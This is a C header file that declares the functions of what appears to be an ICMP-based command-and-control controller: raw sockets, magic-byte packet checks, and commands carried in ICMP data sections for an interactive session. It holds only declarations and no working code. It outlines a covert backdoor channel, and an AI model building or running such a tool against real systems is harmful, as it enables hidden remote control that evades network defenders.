#ifndef C2_H
#define C2_H

#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/icmp.h>

#define BUFFER_SIZE 1472
#define CHECK_ALLOC(x) {if (x == NULL) {fprintf(stderr, "Error: Cannot allocate memory\n"); exit(EXIT_FAILURE);}}

void c2_init_n_call(char *interface_to_bind);
int create_socket(char *inteface_to_bind);
ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size);
unsigned short cksum(unsigned short *addr, int len);
void interact(int sockfd);
void print_connection_succeed(char *src_ip);
unsigned char *get_command(char *input);
int check_magic_byte(struct icmphdr *icmp);
struct sockaddr_in prep_ip_headers(struct iphdr *ip);
unsigned char *parse_data_section(unsigned char *packet);
void prep_icmp_headers(struct icmphdr *icmp, uint16_t checksum);
void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input);

#endif